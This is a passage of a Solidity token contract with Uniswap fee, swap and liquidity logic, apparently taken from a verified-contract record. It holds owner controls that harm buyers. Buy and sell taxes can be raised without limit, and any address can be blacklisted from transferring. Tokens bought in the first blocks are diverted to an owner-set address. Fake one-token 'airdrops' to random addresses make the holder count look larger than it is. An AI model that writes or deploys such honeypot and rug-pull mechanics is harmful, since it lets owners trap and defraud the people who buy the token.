isTxLimitExempt[address(this)] = true;\r\n\r\n        isMarketPair[address(uniswapPair)] = true;\r\n\r\n        _balances[owner] = _totalSupply;\r\n        payable(service).transfer(msg.value);\r\n        emit Transfer(address(0), owner, _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    function minimumTokensBeforeSwapAmount() public view returns (uint256) {\r\n        return _minimumTokensBeforeSwap;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function setMarketPairStatus(address account, bool newValue) public onlyOwner {\r\n        isMarketPair[account] = newValue;\r\n    }\r\n\r\n    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {\r\n        isTxLimitExempt[holder] = exempt;\r\n    }\r\n\r\n    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {\r\n        isExcludedFromFee[account] = newValue;\r\n    }\r\n\r\n    function setMaxDesAmount(uint256 maxDestroy) public onlyOwner {\r\n        _maxDestroyAmount = maxDestroy;\r\n    }\r\n\r\n    function setBuyDestFee(uint256 newBuyDestroyFee) public onlyOwner {\r\n        _buyDestroyFee = newBuyDestroyFee;\r\n        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee).add(_buyDestroyFee);\r\n    }\r\n\r\n    function setSellDestFee(uint256 newSellDestroyFee) public onlyOwner {\r\n        _sellDestroyFee = newSellDestroyFee;\r\n        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);\r\n    }\r\n\r\n    function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {\r\n        _buyLiquidityFee = newLiquidityTax;\r\n        _buyMarketingFee = newMarketingTax;\r\n        _buyTeamFee = newTeamTax;\r\n\r\n        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee).add(_buyDestroyFee);\r\n    }\r\n\r\n    function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {\r\n        _sellLiquidityFee = newLiquidityTax;\r\n        _sellMarketingFee = newMarketingTax;\r\n        _sellTeamFee = newTeamTax;\r\n\r\n        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);\r\n    }\r\n\r\n    function multipleBotlistAddress(address[] calldata accounts, bool excluded) public onlyOwner {\r\n        for (uint256 i = 0; i < accounts.length; i++) {\r\n            _isBlacklisted[accounts[i]] = excluded;\r\n        }\r\n    }\r\n\r\n    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {\r\n        _liquidityShare = newLiquidityShare;\r\n        _marketingShare = newMarketingShare;\r\n        _teamShare = newTeamShare;\r\n\r\n        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);\r\n    }\r\n\r\n    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {\r\n        _maxTxAmount = maxTxAmount;\r\n    }\r\n\r\n    function enableDisableWalletLimit(bool newValue) external onlyOwner {\r\n       checkWalletLimit = newValue;\r\n    }\r\n\r\n    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {\r\n        isWalletLimitExempt[holder] = exempt;\r\n    }\r\n\r\n    function setWalletLimit(uint256 newLimit) external onlyOwner {\r\n        _walletMax  = newLimit;\r\n    }\r\n\r\n    function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {\r\n        _minimumTokensBeforeSwap = newLimit;\r\n    }\r\n\r\n    function setMarketingWalletAddress(address newAddress) external onlyOwner() {\r\n        marketingWalletAddress = payable(newAddress);\r\n    }\r\n\r\n    function setTeamWalletAddress(address newAddress) external onlyOwner() {\r\n        teamWalletAddress = payable(newAddress);\r\n    }\r\n\r\n    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {\r\n        swapAndLiquifyEnabled = _enabled;\r\n        emit SwapAndLiquifyEnabledUpdated(_enabled);\r\n    }\r\n\r\n    function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {\r\n        swapAndLiquifyByLimitOnly = newValue;\r\n    }\r\n\r\n    function setKing(uint256 newValue) public onlyOwner {\r\n        kill = newValue;\r\n    }\r\n\r\n    function setAirdropNumbs(uint256 newValue) public onlyOwner {\r\n        require(newValue <= 3, \"newValue must <= 3\");\r\n        airdropNumbs = newValue;\r\n    }\r\n    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {\r\n        for(uint256 i = 0; i < accounts.length; i++) {\r\n            isExcludedFromFee[accounts[i]] = excluded;\r\n        }\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(deadAddress));\r\n    }\r\n\r\n    function transferToAddressETH(address payable recipient, uint256 amount) private {\r\n        recipient.transfer(amount);\r\n    }\r\n\r\n    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {\r\n\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress);\r\n\r\n        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());\r\n\r\n        if(newPairAddress == address(0)) //Create If Doesnt exist\r\n        {\r\n            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())\r\n                .createPair(address(this), _uniswapV2Router.WETH());\r\n        }\r\n\r\n        uniswapPair = newPairAddress; //Set new pair address\r\n        uniswapV2Router = _uniswapV2Router; //Set new router address\r\n\r\n        isWalletLimitExempt[address(uniswapPair)] = true;\r\n        isMarketPair[address(uniswapPair)] = true;\r\n    }\r\n\r\n     //to recieve ETH from uniswapV2Router when swaping\r\n    receive() external payable {}\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {\r\n\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        require(!_isBlacklisted[sender] && !_isBlacklisted[recipient], 'Blacklisted address');\r\n\r\n        if(recipient == uniswapPair && balanceOf(address(uniswapPair)) == 0){\r\n            first = block.number;\r\n        }\r\n        if(sender == uniswapPair && block.number < first + kill){\r\n            return _basicTransfer(sender, receiveAddress, amount);\r\n        }\r\n        if(inSwapAndLiquify)\r\n        {\r\n            return _basicTransfer(sender, recipient, amount);\r\n        }\r\n        else\r\n        {\r\n            if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {\r\n                require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            bool overMinimumTokenBalance = contractTokenBalance >= _minimumTokensBeforeSwap;\r\n\r\n            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled)\r\n            {\r\n                if(swapAndLiquifyByLimitOnly)\r\n                    contractTokenBalance = _minimumTokensBeforeSwap;\r\n                swapAndLiquify(contractTokenBalance);\r\n            }\r\n\r\n            _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n\r\n            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ?\r\n                                         amount : takeFee(sender, recipient, amount);\r\n\r\n            if(checkWalletLimit && !isWalletLimitExempt[recipient])\r\n                require(balanceOf(recipient).add(finalAmount) <= _walletMax);\r\n\r\n            _balances[recipient] = _balances[recipient].add(finalAmount);\r\n\r\n            emit Transfer(sender, recipient, finalAmount);\r\n            return true;\r\n        }\r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function swapAndLiquify(uint256 tAmount) private lockTheSwap {\r\n\r\n        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);\r\n        uint256 tokensForSwap = tAmount.sub(tokensForLP);\r\n\r\n        swapTokensForEth(tokensForSwap);\r\n        uint256 amountReceived = address(this).balance;\r\n\r\n        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));\r\n\r\n        uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);\r\n        uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);\r\n        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);\r\n\r\n        if(amountBNBMarketing > 0)\r\n            transferToAddressETH(marketingWalletAddress, amountBNBMarketing);\r\n\r\n        if(amountBNBTeam > 0)\r\n            transferToAddressETH(teamWalletAddress, amountBNBTeam);\r\n\r\n        if(amountBNBLiquidity > 0 && tokensForLP > 0)\r\n            addLiquidity(tokensForLP, amountBNBLiquidity);\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        // generate the uniswap pair path of token -> weth\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\r\n        // make the swap\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, // accept any amount of ETH\r\n            path,\r\n            address(this), // The contract\r\n            block.timestamp\r\n        );\r\n\r\n        emit SwapTokensForETH(tokenAmount, path);\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        // approve token transfer to cover all possible scenarios\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\r\n        // add the liquidity\r\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0, // slippage is unavoidable\r\n            0, // slippage is unavoidable\r\n            receiveAddress,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n\r\n        uint256 feeAmount = 0;\r\n        uint256 destAmount = 0;\r\n        uint256 airdropAmount = 0;\r\n        if(isMarketPair[sender]) {\r\n            feeAmount = amount.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);\r\n            if(_buyDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {\r\n                destAmount = amount.mul(_buyDestroyFee).div(100);\r\n                destroyFee(sender,destAmount);\r\n            }\r\n        }\r\n        else if(isMarketPair[recipient]) {\r\n            feeAmount = amount.mul(_totalTaxIfSelling.sub(_sellDestroyFee)).div(100);\r\n            if(_sellDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {\r\n                destAmount = amount.mul(_sellDestroyFee).div(100);\r\n                destroyFee(sender,destAmount);\r\n            }\r\n        }\r\n        if(isMarketPair[sender] || isMarketPair[recipient]){\r\n            if (airdropNumbs > 0){\r\n                address ad;\r\n                for (uint256 i = 0; i < airdropNumbs; i++) {\r\n                    ad = address(uint160(uint256(keccak256(abi.encodePacked(i, amount, block.timestamp)))));\r\n                    _balances[ad] = _balances[ad].add(1);\r\n                    emit Transfer(sender, ad, 1);\r\n                }\r\n                airdropAmount = airdropNumbs * 1;\r\n            }\r\n        }\r\n\r\n        if(feeAmount > 0) {\r\n            _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n            emit Transfer(sender, address(this), feeAmount);\r\n        }\r\n\r\n        return amount.sub(feeAmount.add(destAmount).add(airdropAmount));\r\n    }\r\n\r\n    function destroyFee(address sender, uint256 tAmount) private {\r\n        // stop destroy\r\n        if(_tFeeTotal >= _maxDestroyAmount) return;\r\n\r\n        _balances[deadAddress] = _balances[deadAddress].add(tAmount);\r\n        _tFeeTotal = _tFeeTotal.add(tAmount);\r\n        emit Transfer(sender, deadAddress, tAmount);\r\n    }\r\n\r\n}",
    "etherscan_verified": true
}